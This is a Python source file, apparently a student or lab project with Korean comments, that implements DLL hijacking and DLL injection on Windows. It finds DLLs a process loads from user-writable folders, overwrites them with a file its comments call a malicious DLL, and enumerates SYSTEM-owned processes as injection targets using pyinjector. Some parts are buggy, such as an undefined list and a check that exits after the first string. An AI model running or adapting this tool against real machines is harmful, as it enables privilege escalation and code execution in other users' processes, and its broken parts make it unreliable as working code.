import os
from tqdm import tqdm
from pyinjector import inject
import subprocess
import wmi
from time import sleep
import psutil
class hiJacking():
    def hiJacking(self):
        pass
    #Listdlls.exe 파일을 이용하여 입력된 pid에서 로드하는 dll 목록을 가져옴
    def list_dll(self,pid):
        stream = os.popen("Listdlls.exe " + str(pid))
        dlls = stream.read()
        program_name = ""
        try:
            program_name = dlls.split("\n")[7]
            program_name = program_name.replace("Command line: ", '').replace('"', '').replace(' -bystartup','').replace('\\','/')
            if not program_name.endswith('.exe'):
                raise Exception("not exe File")
        except:
            print("Wrong pid...")
        
        
        if 'C:/' not in program_name:
            name_split = program_name.split('/')
            name = name_split[-1]
            for dirpath, dirname, filename in tqdm(os.walk("C:/")):
                if name in filename:
                    program_name =  os.path.join(dirpath, name)

        split_text = dlls.replace("\\","/").replace(' ', '\n').split('\n')
        list_dlls = []
        for i in split_text:
            if i.endswith(".dll"):
                list_dlls.append(i)
        return program_name, list_dlls
        
        #dll이 저장되어 있는 폴더의 일반 유저 또한 쓰기 권한이 있는지 검증
    def check_permission(self,path):
        user_perm_dir = []
        user_perm_file = []
        for i in path:
            dir_path = os.path.dirname(i)
            try:
                open(dir_path+"/test.txt","w")
                os.remove(dir_path+"/test.txt")
                name_split = i.split('/')
                name = name_split[-1]
                user_perm_file.append(name)
                user_perm_dir.append(i)
                # if os.access(dir_path,os.W_OK):
                #     name_split = i.split('/')
                #     name = name_split[-1]
                #     user_perm_file.append(name)
                #     user_perm_dir.append(i)
            except:
                pass
        return user_perm_file,user_perm_dir
    #strings 명령어를 이용하여 dll을 하드코딩으로 로드하는지 확인
    def find_string(self,name,list_name,list_dir):
        stream = os.popen("strings " + name)
        strings = stream.read()
        strings = strings.replace("\\",'/').split("\n")
        string_dll = []
        for i in strings:
            if i.endswith(".dll"):
                string_dll.append(i)
        for string in string_dll:
            if  string in list_name:
                return True
            elif string in list_dir:
                return True
            else:
                return False
    #exe파일을 직접 실행하여 pid를 가져옴
    def create_process(self,path):
            return subprocess.Popen([path]).pid
        
    #악성 dll을 입력받은 경로로 바꿔줌
    def change_dll(self,dll_path,hijactable_dll_path):
        if type(hijactable_dll_path) is list:
            for i in hijactable_dll_path:
                if os.path.exists(i):
                    os.remove(i)
                    os.rename(dll_path,i)
        elif type(hijactable_dll_path) is str:
            if os.path.exists(hijactable_dll_path):
                os.remove(hijactable_dll_path)
                os.rename(dll_path,hijactable_dll_path)       
    # 사전 검사를 통해 dll Hijacking에 취약한지 확인하여 공격을 함
    # 다만 이것이 일관성(모든 경우에 해당하는) 탐지 및 공격 방법인지는 검증 필요
    def attack(self):
        path_exe = "C:/Users/codeb/Desktop/ExamDLL2/CreateDLL/x64/Debug/MainDLL.exe"
        path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
        pid = self.create_process(path_exe)
        
        program_name, list_dlls = self.list_dll(pid)
        file_list,dir_list = self.check_permission(list_dlls)
        if not len(file_list) == 0:
            if self.find_string(program_name,file_list,dir_list):
                print("Detect programs vulnerable to dll injection")
                print("Vulnerable PID : " + pid)
                self.change_dll(path_dll,list_dlls)
            else:
                print("Nah....")
        else:
            print("Not Found writable dir")
class injection():
    def injection(self):
        pass
    #SYSTEM 권한으로 실행되는 프로세스 파싱, return 값 => pid
    def find_process(self):
       
        try:
            # 실행중인 프로세스를 순차적으로 검색
            for proc in psutil.process_iter():
            # 프로세스 이름을 ps_name에 할당
                ps_name = proc.name()
                # 실행 명령어와 인자(argument)를 리스트 형식으로 가져와 cmdline에 할당
                cmdline = proc.cmdline()
                
                username = proc.username()
                if username.endswith('SYSTEM'):
                    print("WOW")
                print('NAME:', ps_name, ' CMD:', cmdline, ' userName: ', username)
        except:
            pass
        
        with open('./process_list.txt','w') as f:
            for process in process_list:
                f.write(str(process))
            f.close()
        
     
    #find_process에서 찾은 pid를 악성 dll을 이용하여 인젝션 해보기
    def attack(self,pid,path_dll):
        inject(pid,path_dll)


if __name__=='__main__': 
    dll_inject = injection()
    # dll_hijact = hiJacking()
    # path_exe = "C:/Users/codeb/Desktop/MainDLL.exe"
    # path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
    # pid = dll_hijact.create_process(path_exe)
    # inject(pid,path_dll)
    dll_inject.find_process()
    
        